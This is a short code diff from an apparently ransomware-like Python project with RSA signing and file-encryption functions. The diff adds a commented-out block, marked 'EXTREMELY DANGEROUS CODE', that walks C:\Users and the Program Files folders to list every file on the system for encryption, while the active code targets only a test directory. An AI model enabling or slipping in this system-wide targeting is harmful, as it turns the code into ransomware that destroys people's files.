@@ -56,14 +56,29 @@ def verify(msg, signature, key):
     return rsa.verify(msg.encode(FORMAT), signature, key) == "SHA-1"
 
 
-
-
-
+# EXTREMELY DANGEROUS CODE
+# ONLY UNCOMMENT IF YOU KNOW THE RISKS
 def recurseAllFiles():
+    """path = "C:\\Users"
+    for root, dirs, files in os.walk(path):
+        for name in files:
+            yield os.path.join(root, name)
+
+    path = "C:\\Program Files"
+    for root, dirs, files in os.walk(path):
+        for name in files:
+            yield os.path.join(root, name)
+
+    path = "C:\\Program Files (x86)"
+    for root, dirs, files in os.walk(path):
+        for name in files:
+            yield os.path.join(root, name)"""
+
     path = "testkeys\\testdir"
     for root, dirs, files in os.walk(path):
         for name in files:
             yield os.path.join(root, name)
+
 
 
 def encryptFile(path, key):
